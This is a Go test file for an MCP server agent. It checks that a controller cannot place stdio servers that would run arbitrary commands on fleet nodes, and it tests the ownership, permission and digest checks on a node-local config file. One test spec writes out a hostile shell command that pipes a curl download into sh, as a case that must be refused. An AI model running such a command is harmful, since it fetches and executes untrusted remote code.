// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 PersonifAI LLC

package mcpsrv

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/noomesh/noomesh/node-agent-go/internal/refusals"
)

// rootOwnedBinary returns a real root-owned executable. The entry validator
// insists the binary is root-owned (a writable binary is an allow-list
// entry anyone can redefine), so the happy path needs a genuine one rather
// than a fixture — which also means the check is exercised for real.
func rootOwnedBinary(t *testing.T) string {
	t.Helper()
	for _, p := range []string{"/bin/cat", "/usr/bin/cat", "/bin/true", "/usr/bin/true"} {
		st, err := os.Stat(p)
		if err != nil {
			continue
		}
		if sys, ok := st.Sys().(*syscall.Stat_t); ok && sys.Uid == 0 && st.Mode().Perm()&0o022 == 0 {
			return p
		}
	}
	t.Skip("no root-owned binary available in this environment")
	return ""
}

// localFile points the agent at a node-local stdio file with `body` in it,
// under a relaxed ownership rule (a test cannot create a root-owned file).
// The REAL rule is exercised in TestOwnershipIsTheWholeTrustBasis.
func localFile(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "mcp-servers.json")
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	t.Setenv(LocalStdioFileEnv, path)
	testOwnerOK(t)
	return path
}

// testOwnerOK swaps the ownership rule (declared in local.go) for the
// duration of one test.
func testOwnerOK(t *testing.T) {
	t.Helper()
	prev := localOwnerOK
	localOwnerOK = func(string, os.FileInfo) error { return nil }
	t.Cleanup(func() { localOwnerOK = prev })
}

// ── the wall ────────────────────────────────────────────────────────────

// THE finding. A stdio placement carries a command, its args, its cwd and
// its environment from a controller database row, and the agent exec'd it
// as a user in the docker group — so "place an MCP server" was a general
// remote-code-execution verb against every node in the fleet.
//
// A command allow-list was not enough: `uvx`, `npx`, `python` and `node`
// are exactly what an operator allow-lists for MCP, and every one of them
// runs arbitrary code from its arguments. The controller does not get to
// supply stdio servers at all.
func TestControllerCannotPlaceAStdioServer(t *testing.T) {
	refusals.Reset()
	t.Cleanup(refusals.Reset)
	localFile(t, `[]`)

	s := New(nil, nil, nil)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// Every shape, including one naming a binary the node would otherwise
	// be happy to run.
	for _, spec := range []string{
		`{"command":"uvx","args":["mcp-server-git"]}`,
		`{"command":"/bin/cat"}`,
		`{"command":"/bin/sh","args":["-c","curl http://x|sh"]}`,
	} {
		s.Apply(ctx, []Placement{{ID: "evil", Transport: "stdio", Spec: json.RawMessage(spec)}})
		if got := s.Statuses(); len(got) != 0 {
			t.Fatalf("spec %s started something: %+v", spec, got)
		}
	}

	// REFUSED, not silently skipped: noo_mcp_placements records intent and
	// nothing else, so without this the operator sees a placement that
	// simply never happens.
	var found *refusals.Refusal
	for _, r := range refusals.List() {
		if r.Scope == "mcp_server" && r.Target == "evil" {
			r := r
			found = &r
		}
	}
	if found == nil {
		t.Fatalf("the refusal must reach the controller: %+v", refusals.List())
	}
	if !strings.Contains(found.Reason, "may not place a stdio MCP server") {
		t.Errorf("reason must say what was refused: %q", found.Reason)
	}
	if !strings.Contains(found.Reason, "mcp-servers.json") {
		t.Errorf("reason must name the node-local file: %q", found.Reason)
	}
}

// http placements are untouched: a URL this node dials out to is not a
// process it executes, and refusing them would break the transport that
// exists precisely so the controller does not need the other one.
func TestControllerMayStillPlaceHTTPServers(t *testing.T) {
	refusals.Reset()
	t.Cleanup(refusals.Reset)
	localFile(t, `[]`)

	s := New(nil, nil, nil)
	wanted := s.resolveWanted([]Placement{
		{ID: "docs", Transport: "streamable_http", Spec: json.RawMessage(`{"url":"https://mcp.example/mcp"}`)},
	})
	if _, ok := wanted["docs"]; !ok {
		t.Fatalf("an http placement must survive: %+v", wanted)
	}
}

// A placement whose desired_state is "stopped" is still the controller's to
// say — it is which, not what.
func TestControllerStopStillApplies(t *testing.T) {
	localFile(t, `[]`)
	s := New(nil, nil, nil)
	wanted := s.resolveWanted([]Placement{
		{ID: "docs", Transport: "streamable_http", DesiredState: "stopped",
			Spec: json.RawMessage(`{"url":"https://mcp.example/mcp"}`)},
	})
	if _, ok := wanted["docs"]; ok {
		t.Fatalf("a stopped placement must not be wanted: %+v", wanted)
	}
}

// ── the node-local file ─────────────────────────────────────────────────

func TestLocalFileDeclaresTheServer(t *testing.T) {
	refusals.Reset()
	t.Cleanup(refusals.Reset)
	bin := rootOwnedBinary(t)
	localFile(t, `[
      {"id":"git","image":"`+testImage+`","command":"`+bin+`","args":["--repo","/srv/x"],"env":{"A":"1"}},
      {"id":"off","image":"`+testImage+`","command":"`+bin+`","disabled":true}
    ]`)

	s := New(nil, nil, nil)
	wanted := s.resolveWanted(nil)
	got, ok := wanted["git"]
	if !ok {
		t.Fatalf("the node's own server must be wanted: %+v", wanted)
	}
	if got.Transport != transportContainer {
		t.Errorf("transport = %q", got.Transport)
	}
	var spec containerSpec
	if err := json.Unmarshal(got.Spec, &spec); err != nil {
		t.Fatal(err)
	}
	if spec.Command != bin || len(spec.Args) != 2 || spec.Env["A"] != "1" {
		t.Errorf("spec = %+v", spec)
	}
	if _, ok := wanted["off"]; ok {
		t.Error("a disabled entry must not be started")
	}
}

// A missing file is the normal case — it means this node runs no stdio MCP
// server, which is every node unless an operator set one up. It must not be
// an error, or every node in the fleet would report one.
func TestNoLocalFileIsNotAnError(t *testing.T) {
	t.Setenv(LocalStdioFileEnv, filepath.Join(t.TempDir(), "absent.json"))
	entries, refs, err := LoadLocalStdio()
	if err != nil || len(entries) != 0 || len(refs) != 0 {
		t.Fatalf("entries=%v refusals=%v err=%v", entries, refs, err)
	}
}

// One bad entry must not take the others offline — but it must be reported,
// not dropped.
func TestABadEntryIsRefusedNotSilent(t *testing.T) {
	refusals.Reset()
	t.Cleanup(refusals.Reset)
	bin := rootOwnedBinary(t)
	notRoot := filepath.Join(t.TempDir(), "mine")
	if err := os.WriteFile(notRoot, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	localFile(t, `[
      {"id":"good","image":"`+testImage+`","command":"`+bin+`"},
      {"id":"relative","image":"`+testImage+`","command":"uvx"},
      {"id":"mine","image":"`+testImage+`","command":"`+notRoot+`"},
      {"id":"gone","image":"`+testImage+`","command":"/nonexistent/binary"},
      {"id":"BadId","image":"`+testImage+`","command":"`+bin+`"},
      {"id":"digest","image":"`+testImage+`","command":"`+bin+`","sha256":"`+strings.Repeat("a", 64)+`"}
    ]`)

	entries, refs, err := loadLocalStdio(LocalStdioPath(), localOwnerOK)
	if err != nil {
		t.Fatalf("the file itself is fine: %v", err)
	}
	if len(entries) != 1 || entries[0].ID != "good" {
		t.Fatalf("the good entry must survive: %+v", entries)
	}
	for id, want := range map[string]string{
		"relative": "absolute path",
		"mine":     "owned by root",
		"gone":     "no such file",
		"BadId":    "must match",
		"digest":   "does not match the sha256",
	} {
		why, ok := refs[id]
		if !ok {
			t.Errorf("%s must be refused; refusals = %v", id, refs)
			continue
		}
		if !strings.Contains(why, want) {
			t.Errorf("%s refusal = %q, want it to mention %q", id, why, want)
		}
	}
}

// The digest the operator records is verified on every load, so a binary
// swapped underneath the file stops the server rather than running.
func TestRecordedDigestIsVerified(t *testing.T) {
	bin := rootOwnedBinary(t)
	sum, err := fileSHA256(bin)
	if err != nil {
		t.Fatal(err)
	}
	localFile(t, `[{"id":"pinned","image":"`+testImage+`","command":"`+bin+`","sha256":"`+strings.ToUpper(sum)+`"}]`)
	entries, refs, err := loadLocalStdio(LocalStdioPath(), localOwnerOK)
	if err != nil || len(entries) != 1 {
		t.Fatalf("a matching digest must be accepted: entries=%v refusals=%v err=%v", entries, refs, err)
	}
}

// ── ownership: the whole trust basis ────────────────────────────────────

// If the agent's own user can write this file, then anything that
// compromises the AGENT can hand the agent a new binary to run — and the
// point of this package is that a control-plane compromise does not become
// code execution. So the real rule gets its own test against real paths,
// because every other test in this file relaxes it.
func TestOwnershipIsTheWholeTrustBasis(t *testing.T) {
	// A file this test's user owns: refused, naming the fix.
	mine := filepath.Join(t.TempDir(), "mcp-servers.json")
	if err := os.WriteFile(mine, []byte("[]"), 0o644); err != nil {
		t.Fatal(err)
	}
	st, err := os.Stat(mine)
	if err != nil {
		t.Fatal(err)
	}
	if sys, ok := st.Sys().(*syscall.Stat_t); ok && sys.Uid == 0 {
		t.Skip("running as root; the non-root case cannot be constructed")
	}
	err = requireRootOwned(mine, st)
	if err == nil {
		t.Fatal("a file the agent's user owns must be refused")
	}
	if !strings.Contains(err.Error(), "chown root:root") {
		t.Errorf("the refusal must name the fix: %v", err)
	}

	// And it really is reached through the loader, so the rule is not
	// merely a function nobody calls.
	t.Setenv(LocalStdioFileEnv, mine)
	if _, _, err := LoadLocalStdio(); err == nil {
		t.Fatal("LoadLocalStdio must refuse a non-root-owned file")
	}

	// A genuinely root-owned path is accepted.
	for _, p := range []string{"/etc/hostname", "/etc/passwd"} {
		st, err := os.Stat(p)
		if err != nil {
			continue
		}
		if err := requireRootOwned(p, st); err != nil {
			t.Errorf("%s is root-owned and must be accepted: %v", p, err)
		}
		return
	}
	t.Skip("no root-owned reference file available")
}

// A group- or world-writable file is as good as one the agent owns.
func TestWritableFileIsRefused(t *testing.T) {
	p := filepath.Join(t.TempDir(), "f")
	if err := os.WriteFile(p, []byte("[]"), 0o666); err != nil {
		t.Fatal(err)
	}
	st, err := os.Stat(p)
	if err != nil {
		t.Fatal(err)
	}
	// Force the owner check past uid so the mode check is what answers.
	if sys, ok := st.Sys().(*syscall.Stat_t); ok && sys.Uid != 0 {
		// Non-root: the uid branch fires first, which is also correct.
		if err := requireRootOwned(p, st); err == nil {
			t.Fatal("a world-writable, non-root file must be refused")
		}
		return
	}
	if err := requireRootOwned(p, st); err == nil || !strings.Contains(err.Error(), "writable") {
		t.Fatalf("a world-writable file must be refused for its mode: %v", err)
	}
}

// A malformed file stops everything it would have started, and says so —
// that is not a typo in one row, it is a misconfiguration or an attack.
func TestMalformedFileIsAWholeFileError(t *testing.T) {
	localFile(t, `{"id": "not-an-array"}`)
	_, _, err := loadLocalStdio(LocalStdioPath(), localOwnerOK)
	if err == nil || !strings.Contains(err.Error(), "JSON array") {
		t.Fatalf("want a whole-file error naming the shape, got %v", err)
	}
}
